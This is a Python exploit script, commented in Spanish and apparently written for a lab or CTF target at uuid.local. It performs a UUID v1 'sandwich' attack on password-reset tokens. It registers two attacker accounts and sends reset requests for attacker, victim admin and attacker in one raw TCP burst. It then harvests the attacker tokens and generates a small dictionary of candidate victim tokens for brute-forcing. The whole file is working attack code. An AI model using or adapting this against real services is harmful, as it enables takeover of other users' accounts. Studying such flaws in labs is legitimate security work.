#!/usr/bin/env python3
"""
Fast Sandwich - UUID v1

Envía las 3 requests de reset en una sola conexión TCP para minimizar
la ventana de tiempo entre los UUIDs generados.

Esto hace que los 3 UUIDs tengan timestamps consecutivos (separados
por ~100ns), reduciendo el diccionario de 91M a típicamente 1-10 entradas.

Uso:
  python fast_sandwich.py <url>
  python fast_sandwich.py http://uuid.local:8060
"""

import sys, re, time, json, socket
from urllib.parse import urlparse

def parse_ts(u):
    p = u.split("-")
    tl = int(p[0], 16)
    tm = int(p[1], 16)
    th = int(p[2], 16) & 0xFFF
    return (th << 48) | (tm << 32) | tl

def ts_hex(ts):
    tl = ts & 0xFFFFFFFF
    tm = (ts >> 32) & 0xFFFF
    th = (ts >> 48) & 0xFFF
    return f"{tl:08x}-{tm:04x}-{0x1000 | th:04x}"

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8060"
SRV = urlparse(BASE)
HOST = SRV.hostname
PORT = SRV.port or (443 if SRV.scheme == "https" else 80)

ATK1, ATK2, VIC = "atk1@sand.com", "atk2@sand.com", "admin@uuid.local"
PWD = "fast123"

import requests

# 1. Registrar atacantes (ignora si ya existen)
for e in [ATK1, ATK2]:
    requests.post(f"{BASE}/register", data={"email": e, "password": PWD, "confirm": PWD})

# 2. Login y limpiar mailboxes
s1 = requests.Session()
s2 = requests.Session()
s1.post(f"{BASE}/login", data={"email": ATK1, "password": PWD})
s2.post(f"{BASE}/login", data={"email": ATK2, "password": PWD})
s1.post(f"{BASE}/reset-password", json={"email": ATK1})
s2.post(f"{BASE}/reset-password", json={"email": ATK2})

print("[*] Enviando 3 requests en un solo paquete TCP ...", file=sys.stderr)

t0 = time.perf_counter()

# Construir las 3 requests HTTP en crudo
raw = b""
for email in [ATK1, VIC, ATK2]:
    body = json.dumps({"email": email})
    raw += (
        f"POST /reset-password HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    ).encode()

# Enviar todo de una vez
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((HOST, PORT))
sock.sendall(raw)

# Leer las 3 respuestas HTTP completas
data = b""
while True:
    chunk = sock.recv(65536)
    if not chunk:
        break
    data += chunk
    # Verificar si hemos recibido 3 respuestas completas
    count = data.count(b"HTTP/1.1")
    if count >= 3:
        # Si hay una 4�, leer m�s
        if data.count(b"\r\n\r\n") >= 3:
            # Verificar que los bodies est�n completos
            # (m�todo simple: buscar 3 HTTP/1.1 y ver content-length)
            break

sock.close()
t1 = time.perf_counter()

# 3. Obtener UUIDs de los mailboxes
def get_token(sesh):
    m = re.findall(r"/reset/([a-f0-9-]+)", sesh.get(f"{BASE}/mailbox").text)
    return m[-1] if m else None

u1 = get_token(s1)
u2 = get_token(s2)

if not u1 or not u2:
    print("[-] No se encontraron UUIDs en los mailboxes", file=sys.stderr)
    sys.exit(1)

ts1, ts2 = parse_ts(u1), parse_ts(u2)
if ts1 > ts2: ts1, ts2, u1, u2 = ts2, ts1, u2, u1
diff = ts2 - ts1
cs, nd = u1.split("-")[3], u1.split("-")[4]

total_ms = (t1 - t0) * 1000
print(f"\n  Latencia total:      {total_ms:.3f}ms", file=sys.stderr)
print(f"  UUID1 (ATK1):        {u1}", file=sys.stderr)
print(f"  UUID2 (ATK2):        {u2}", file=sys.stderr)
print(f"  Diferencia:          {diff:,} intervalos ({diff/10_000:.3f}ms)", file=sys.stderr)
print(f"  Diccionario:         {diff+1:,} entradas", file=sys.stderr)
print(f"  clock_seq: {cs}      node: {nd}", file=sys.stderr)

# 4. Generar diccionario (solo si es razonable)
if diff > 10_000_000:
    print(f"\n[-] Diccionario muy grande ({diff+1:,}). Usa bruteforce.py si quieres.", file=sys.stderr)
    sys.exit(0)

fname = "diccionario.txt"
print(f"\n[*] Generando {fname} ({diff+1:,} l�neas) ...", file=sys.stderr)
lines = []
for ts in range(ts1, ts2 + 1):
    lines.append(ts_hex(ts) + "\n")
with open(fname, "w") as f:
    f.writelines(lines)
print(f"  -> {fname}", file=sys.stderr)
